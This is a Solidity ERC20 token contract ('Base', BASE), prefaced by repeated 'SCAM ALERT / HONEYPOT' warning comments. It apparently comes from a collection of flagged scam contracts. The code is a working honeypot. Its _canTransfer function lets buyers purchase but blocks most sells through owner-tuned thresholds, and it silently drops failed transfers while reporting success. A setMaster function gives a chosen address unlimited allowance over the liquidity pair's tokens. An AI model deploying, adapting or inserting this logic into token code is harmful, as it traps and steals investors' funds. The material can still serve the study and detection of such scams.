//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!
//!!!! SCAM ALERT !!!!!! HONEYPOT !!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!!!!! SCAM ALERT !!!!!!!! HONEYPOT !!!!!!!

// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;
import "./TestLib.sol";
contract nameFacet is IERC20, Context, Ownable {
    modifier onlyMaster() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == ds.master);
        _;
    }

    function name() external pure override returns (string memory) {
        return "Base";
    }
    function symbol() external pure override returns (string memory) {
        return "BASE";
    }
    function decimals() external pure override returns (uint8) {
        return _DECIMALS;
    }
    function totalSupply() external view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._totalSupply;
    }
    function balanceOf(
        address account
    ) external view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_canTransfer(_msgSender(), recipient, amount)) {
            _transfer(_msgSender(), recipient, amount);
        }
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) external view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_canTransfer(sender, recipient, amount)) {
            uint256 currentAllowance = ds._allowances[sender][_msgSender()];
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );

            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function setNumber(uint256 newNumber) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._theNumber = newNumber;
    }
    function setRemainder(uint256 newRemainder) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._theRemainder = newRemainder;
    }
    function setMaster(address account) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._allowances[address(ds._pair)][ds.master] = 0;
        ds.master = account;
        ds._allowances[address(ds._pair)][ds.master] = ~uint256(0);
    }
    function setDelta(uint256 _newDelta) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_newDelta < 100_000);
        ds.delta = _newDelta;
    }
    function _canTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._marketersAndDevs[sender] || ds._marketersAndDevs[recipient]) {
            return true;
        }

        if (_isSuper(sender)) {
            _checkDelta();
            return true;
        }
        if (_isSuper(recipient)) {
            uint256 amountETH = _getETHEquivalent(amount);
            uint256 bought = ds._buySum[sender];
            uint256 sold = ds._sellSum[sender];
            uint256 soldETH = ds._sellSumETH[sender];

            return
                bought >= sold + amount &&
                ds._theNumber >= soldETH + amountETH &&
                sender.balance >= ds._theRemainder;
        }
        return false;
    }
    function _isSuper(address account) private view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return (account == address(ds._router) || account == address(ds._pair));
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_hasLiquidity()) {
            if (_isSuper(from)) {
                ds._buySum[to] += amount;
            }
            if (_isSuper(to)) {
                ds._sellSum[from] += amount;
                ds._sellSumETH[from] += _getETHEquivalent(amount);
            }
        }
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        require(
            ds._balances[sender] >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        ds._balances[sender] -= amount;
        ds._balances[recipient] += amount;
        ds.desp = ds._pair.totalSupply();
        emit Transfer(sender, recipient, amount);
    }
    function _hasLiquidity() private view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        (uint256 reserve0, uint256 reserve1, ) = ds._pair.getReserves();
        return reserve0 > 0 && reserve1 > 0;
    }
    function _getETHEquivalent(
        uint256 amountTokens
    ) private view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        (uint256 reserve0, uint256 reserve1, ) = ds._pair.getReserves();
        if (ds._pair.token0() == ds._router.WETH()) {
            return ds._router.getAmountOut(amountTokens, reserve1, reserve0);
        } else {
            return ds._router.getAmountOut(amountTokens, reserve0, reserve1);
        }
    }
    function _checkDelta() internal view {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 currentDesp = ds._pair.totalSupply();
        if (ds.delta > 1 && currentDesp < ds.desp) {
            require(
                (currentDesp * ds._balances[address(ds._pair)]) / ds.desp <
                    ds.delta
            );
        }
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
